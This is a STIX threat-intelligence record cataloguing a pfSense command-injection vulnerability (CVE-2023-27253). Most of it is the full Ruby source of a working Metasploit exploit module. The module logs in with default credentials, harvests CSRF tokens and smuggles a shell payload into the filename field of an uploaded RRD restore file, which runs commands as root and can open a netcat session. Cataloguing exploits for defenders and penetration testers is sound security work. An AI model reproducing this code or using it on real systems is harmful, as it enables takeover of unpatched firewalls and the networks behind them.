{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--500affcf-862a-4438-acf3-027e91ec42b1",
    "created": "2024-08-14T17:14:43.037971Z",
    "modified": "2024-08-14T17:14:43.037975Z",
    "name": "pfSense Restore RRD Data Command Injection",
    "description": " This module exploits an authenticated command injection vulnerabilty in the \"restore_rrddata()\" function of pfSense prior to version 2.7.0 which allows an authenticated attacker with the  \"WebCfg - Diagnostics: Backup & Restore\" privilege to execute arbitrary operating system commands as the \"root\" user.  This module has been tested successfully on version 2.6.0-RELEASE.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/pfsense_config_data_exec.rb",
            "external_id": "pfsense_config_data_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-27253"
        },
        {
            "source_name": "reference",
            "url": "https://redmine.pfsense.org/issues/13935"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pfsense/pfsense/commit/ca80d18493f8f91b21933ebd6b714215ae1e5e94"
        }
    ],
    "x_code_snippet": "class MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'pfSense Restore RRD Data Command Injection',\n        'Description' => %q{\n          This module exploits an authenticated command injection vulnerabilty in the \"restore_rrddata()\" function of\n          pfSense prior to version 2.7.0 which allows an authenticated attacker with the  \"WebCfg - Diagnostics: Backup & Restore\"\n          privilege to execute arbitrary operating system commands as the \"root\" user.\n\n          This module has been tested successfully on version 2.6.0-RELEASE.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Emir Polat', # vulnerability discovery & metasploit module\n        ],\n        'References' => [\n          ['CVE', '2023-27253'],\n          ['URL', 'https://redmine.pfsense.org/issues/13935'],\n          ['URL', 'https://github.com/pfsense/pfsense/commit/ca80d18493f8f91b21933ebd6b714215ae1e5e94']\n        ],\n        'DisclosureDate' => '2023-03-18',\n        'Platform' => ['unix'],\n        'Arch' => [ ARCH_CMD ],\n        'Privileged' => true,\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'Payload' => {\n          'BadChars' => \"\\x2F\\x27\",\n          'Compat' =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic netcat'\n            }\n        },\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'pfsense'])\n    ]\n  end\n\n  def check\n    unless login\n      return Exploit::CheckCode::Unknown(\"#{peer} - Could not obtain the login cookies needed to validate the vulnerability!\")\n    end\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'diag_backup.php'),\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n\n    return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return Exploit::CheckCode::Unknown(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    unless res&.body&.include?('Diagnostics: ')\n      return Exploit::CheckCode::Safe('Vulnerable module not reachable')\n    end\n\n    version = detect_version\n    unless version\n      return Exploit::CheckCode::Detected('Unable to get the pfSense version')\n    end\n\n    unless Rex::Version.new(version) < Rex::Version.new('2.7.0-RELEASE')\n      return Exploit::CheckCode::Safe(\"Patched pfSense version #{version} detected\")\n    end\n\n    Exploit::CheckCode::Appears(\"The target appears to be running pfSense version #{version}, which is unpatched!\")\n  end\n\n  def login\n    # Skip the login process if we are already logged in.\n    return true if @logged_in\n\n    csrf = get_csrf('index.php', 'GET')\n    unless csrf\n      print_error('Could not get the expected CSRF token for index.php when attempting login!')\n      return false\n    end\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'POST',\n      'vars_post' => {\n        '__csrf_magic' => csrf,\n        'usernamefld' => datastore['USERNAME'],\n        'passwordfld' => datastore['PASSWORD'],\n        'login' => ''\n      },\n      'keep_cookies' => true\n    )\n\n    if res && res.code == 302\n      @logged_in = true\n      true\n    else\n      false\n    end\n  end\n\n  def detect_version\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n\n    # If the response isn't a 200 ok response or is an empty response, just return nil.\n    unless res && res.code == 200 && res.body\n      return nil\n    end\n\n    if (%r{Version.+<strong>(?<version>[0-9.]+-RELEASE)\\n?</strong>}m =~ res.body).nil?\n      nil\n    else\n      version\n    end\n  end\n\n  def get_csrf(uri, methods)\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, uri),\n      'method' => methods,\n      'keep_cookies' => true\n    )\n\n    unless res && res.body\n      return nil # If no response was returned or an empty response was returned, then return nil.\n    end\n\n    # Try regex match the response body and save the match into a variable named csrf.\n    if (/var csrfMagicToken = \"(?<csrf>sid:[a-z0-9,;:]+)\";/ =~ res.body).nil?\n      return nil # No match could be found, so the variable csrf won't be defined.\n    else\n      return csrf\n    end\n  end\n\n  def drop_config\n    csrf = get_csrf('diag_backup.php', 'GET')\n    unless csrf\n      fail_with(Failure::UnexpectedReply, 'Could not get the expected CSRF token for diag_backup.php when dropping the config!')\n    end\n\n    post_data = Rex::MIME::Message.new\n\n    post_data.add_part(csrf, nil, nil, 'form-data; name=\"__csrf_magic\"')\n    post_data.add_part('rrddata', nil, nil, 'form-data; name=\"backuparea\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"encrypt_password\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"encrypt_password_confirm\"')\n    post_data.add_part('Download configuration as XML', nil, nil, 'form-data; name=\"download\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"restorearea\"')\n    post_data.add_part('', 'application/octet-stream', nil, 'form-data; name=\"conffile\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"decrypt_password\"')\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'diag_backup.php'),\n      'method' => 'POST',\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data' => post_data.to_s,\n      'keep_cookies' => true\n    )\n\n    if res && res.code == 200 && res.body =~ /<rrddatafile>/\n      return res.body\n    else\n      return nil\n    end\n  end\n\n  def exploit\n    unless login\n      fail_with(Failure::NoAccess, 'Could not obtain the login cookies!')\n    end\n\n    csrf = get_csrf('diag_backup.php', 'GET')\n    unless csrf\n      fail_with(Failure::UnexpectedReply, 'Could not get the expected CSRF token for diag_backup.php when starting exploitation!')\n    end\n\n    config_data = drop_config\n    if config_data.nil?\n      fail_with(Failure::UnexpectedReply, 'The drop config response was empty!')\n    end\n\n    if (%r{<filename>(?<file>.*?)</filename>} =~ config_data).nil?\n      fail_with(Failure::UnexpectedReply, 'Could not get the filename from the drop config response!')\n    end\n    config_data.gsub!(' ', '${IFS}')\n    send_p = config_data.gsub(file, \"WAN_DHCP-quality.rrd';#{payload.encoded};\")\n\n    post_data = Rex::MIME::Message.new\n\n    post_data.add_part(csrf, nil, nil, 'form-data; name=\"__csrf_magic\"')\n    post_data.add_part('rrddata', nil, nil, 'form-data; name=\"backuparea\"')\n    post_data.add_part('yes', nil, nil, 'form-data; name=\"donotbackuprrd\"')\n    post_data.add_part('yes', nil, nil, 'form-data; name=\"backupssh\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"encrypt_password\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"encrypt_password_confirm\"')\n    post_data.add_part('rrddata', nil, nil, 'form-data; name=\"restorearea\"')\n    post_data.add_part(send_p.to_s, 'text/xml', nil, \"form-data; name=\\\"conffile\\\"; filename=\\\"rrddata-config-pfSense.home.arpa-#{rand_text_alphanumeric(14)}.xml\\\"\")\n    post_data.add_part('', nil, nil, 'form-data; name=\"decrypt_password\"')\n    post_data.add_part('Restore Configuration', nil, nil, 'form-data; name=\"restore\"')\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'diag_backup.php'),\n      'method' => 'POST',\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data' => post_data.to_s,\n      'keep_cookies' => true\n    )\n\n    if res\n      print_error(\"The response to a successful exploit attempt should be 'nil'. The target responded with an HTTP response code of #{res.code}. Try rerunning the module.\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-03-18",
    "x_mitre_platforms": [
        "['unix']"
    ]
}